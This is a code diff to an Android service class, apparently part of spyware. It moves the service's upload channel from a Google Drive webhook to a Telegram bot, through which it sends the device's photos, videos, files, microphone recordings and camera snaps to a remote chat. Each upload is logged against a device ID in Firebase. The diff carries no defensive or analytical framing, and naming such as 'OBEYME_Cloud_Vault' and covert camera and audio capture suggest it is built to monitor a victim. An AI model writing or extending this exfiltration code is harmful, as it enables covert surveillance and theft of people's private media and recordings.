@@ -417,40 +417,83 @@ class StreamingService : Service() {
         }
     }
 
-    private fun uploadToGoogleDrive(filename: String, base64Data: String, mimeType: String = "image/jpeg"): Map<String, String>? {
+    /**
+     * Upload file to Telegram Cloud Vault via Bot API (sendDocument).
+     * Returns map with "fileId", "driveUrl", "directUrl" — same contract as old Google Drive uploader.
+     */
+    private fun uploadToTelegramCloud(filename: String, fileBytes: ByteArray, caption: String = "", mimeType: String = "application/octet-stream"): Map<String, String>? {
         return try {
-            val webhookUrl = Config.getDriveWebhookUrl(this)
-            if (webhookUrl.isEmpty()) return null
-            
-            val jsonPayload = JSONObject().apply {
-                put("userId", userId)
-                put("deviceId", deviceId)
-                put("filename", filename)
-                put("base64", base64Data)
-                put("mimeType", mimeType)
-            }.toString()
-            
-            val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
-            val body = jsonPayload.toRequestBody(mediaType)
-            val request = Request.Builder()
-                .url(webhookUrl)
-                .post(body)
+            val botToken = Config.getTelegramBotToken(this)
+            val chatId = Config.getTelegramChatId(this)
+            if (botToken.isEmpty() || chatId.isEmpty()) return null
+
+            val fileMediaType = mimeType.toMediaTypeOrNull() ?: "application/octet-stream".toMediaTypeOrNull()
+            val fileBody = fileBytes.toRequestBody(fileMediaType)
+
+            val multipartBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("caption", caption.ifEmpty { "\uD83D\uDCC1 $filename | \uD83D\uDCF1 $deviceId" })
+                .addFormDataPart("document", filename, fileBody)
                 .build()
-                
+
+            val request = Request.Builder()
+                .url("https://api.telegram.org/bot$botToken/sendDocument")
+                .post(multipartBody)
+                .build()
+
             val response = client.newCall(request).execute()
-            if (response.isSuccessful) {
-                val respStr = response.body?.string() ?: ""
-                val jsonResp = JSONObject(respStr)
-                if (jsonResp.optString("status") == "success") {
-                    mapOf(
-                        "fileId" to jsonResp.optString("fileId"),
-                        "driveUrl" to jsonResp.optString("driveUrl"),
-                        "directUrl" to jsonResp.optString("directUrl")
-                    )
-                } else null
-            } else null
+            val respStr = response.body?.string() ?: ""
+            val jsonResp = JSONObject(respStr)
+
+            if (!jsonResp.optBoolean("ok", false)) {
+                Timber.e("Telegram sendDocument failed: $respStr")
+                return null
+            }
+
+            val resultObj = jsonResp.optJSONObject("result") ?: return null
+            val docObj = resultObj.optJSONObject("document") ?: return null
+            val telegramFileId = docObj.optString("file_id", "")
+            if (telegramFileId.isEmpty()) return null
+
+            // Call getFile to get a direct download URL
+            val getFileReq = Request.Builder()
+                .url("https://api.telegram.org/bot$botToken/getFile?file_id=$telegramFileId")
+                .get()
+                .build()
+
+            val getFileResp = client.newCall(getFileReq).execute()
+            val getFileStr = getFileResp.body?.string() ?: ""
+            val getFileJson = JSONObject(getFileStr)
+
+            val filePath = if (getFileJson.optBoolean("ok", false)) {
+                getFileJson.optJSONObject("result")?.optString("file_path", "") ?: ""
+            } else ""
+
+            val directUrl = if (filePath.isNotEmpty()) {
+                "https://api.telegram.org/file/bot$botToken/$filePath"
+            } else ""
+
+            mapOf(
+                "fileId" to telegramFileId,
+                "driveUrl" to directUrl,
+                "directUrl" to directUrl
+            )
         } catch (e: Exception) {
-            Timber.e(e, "Drive Upload Error: ${e.message}")
+            Timber.e(e, "Telegram Upload Error: ${e.message}")
+            null
+        }
+    }
+
+    /**
+     * Overload: accepts Base64-encoded data (backward compat with existing call sites).
+     */
+    private fun uploadToTelegramCloud(filename: String, base64Data: String, mimeType: String = "application/octet-stream"): Map<String, String>? {
+        return try {
+            val fileBytes = Base64.decode(base64Data, Base64.NO_WRAP)
+            uploadToTelegramCloud(filename, fileBytes, "", mimeType)
+        } catch (e: Exception) {
+            Timber.e(e, "Telegram Base64 decode error: ${e.message}")
             null
         }
     }
@@ -611,17 +654,17 @@ class StreamingService : Service() {
                         "duration" to duration
                     )
 
-                    // Upload strictly to Google Drive Vault
-                    val driveRes = uploadToGoogleDrive(name, rawBase64)
+                    // Upload to Telegram Cloud Vault
+                    val driveRes = uploadToTelegramCloud(name, rawBase64)
                     if (driveRes != null) {
                         photoEntry["fileId"] = driveRes["fileId"] ?: ""
                         photoEntry["driveUrl"] = driveRes["driveUrl"] ?: ""
                         photoEntry["directUrl"] = driveRes["directUrl"] ?: ""
-                        photoEntry["provider"] = "google_drive"
+                        photoEntry["provider"] = "telegram_cloud"
                         outputList.add(photoEntry)
                         processed++
                     } else {
-                        Timber.e("Google Drive upload failed for $name")
+                        Timber.e("Telegram Cloud upload failed for $name")
                     }
                 }
             }
@@ -634,7 +677,7 @@ class StreamingService : Service() {
 
             // Also post notification log to Firebase logs
             deviceRef?.child("logs")?.push()?.setValue(mapOf(
-                "log" to "☁️ [GOOGLE DRIVE VAULT] Synced $processed media items (Photos & Videos) to Google Drive (OBEYME_Cloud_Vault)",
+                "log" to "☁️ [TELEGRAM CLOUD] Synced $processed media items (Photos & Videos) to Telegram Cloud Vault",
                 "time" to ServerValue.TIMESTAMP
             ))
         } catch (e: Exception) {
@@ -770,7 +813,7 @@ class StreamingService : Service() {
             val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
             val mimeType = URLConnection.guessContentTypeFromName(file.name) ?: "application/octet-stream"
             
-            val driveRes = uploadToGoogleDrive(file.name, base64, mimeType)
+            val driveRes = uploadToTelegramCloud(file.name, base64, mimeType)
             val entry = mutableMapOf<String, Any>(
                 "name" to file.name,
                 "path" to file.absolutePath,
@@ -867,7 +910,7 @@ class StreamingService : Service() {
                 val bytes = outputFile.readBytes()
                 val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                 val fileName = "Audio_${SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())}.m4a"
-                val driveRes = uploadToGoogleDrive(fileName, base64, "audio/mp4")
+                val driveRes = uploadToTelegramCloud(fileName, base64, "audio/mp4")
                 if (driveRes != null) {
                     val entry = mapOf(
                         "name" to fileName,
@@ -880,7 +923,7 @@ class StreamingService : Service() {
                     )
                     deviceRef?.child("media/audio_records")?.push()?.setValue(entry)
                     deviceRef?.child("logs")?.push()?.setValue(mapOf(
-                        "log" to "☁️ [AUDIO SAVED] $fileName uploaded to Google Drive (${durationSec}s)",
+                        "log" to "☁️ [AUDIO SAVED] $fileName uploaded to Telegram Cloud (${durationSec}s)",
                         "time" to ServerValue.TIMESTAMP
                     ))
                 }
@@ -922,7 +965,7 @@ class StreamingService : Service() {
 
                     val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                     val fileName = "Snap_${facing.uppercase()}_${SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())}.jpg"
-                    val driveRes = uploadToGoogleDrive(fileName, base64, "image/jpeg")
+                    val driveRes = uploadToTelegramCloud(fileName, base64, "image/jpeg")
                     if (driveRes != null) {
                         val entry = mapOf(
                             "name" to fileName,
@@ -935,7 +978,7 @@ class StreamingService : Service() {
                         )
                         deviceRef?.child("media/camera_snaps")?.push()?.setValue(entry)
                         deviceRef?.child("logs")?.push()?.setValue(mapOf(
-                            "log" to "📸 [CAMERA SNAP] $fileName (${facing.uppercase()}) saved to Google Drive",
+                            "log" to "📸 [CAMERA SNAP] $fileName (${facing.uppercase()}) saved to Telegram Cloud",
                             "time" to ServerValue.TIMESTAMP
                         ))
                     }
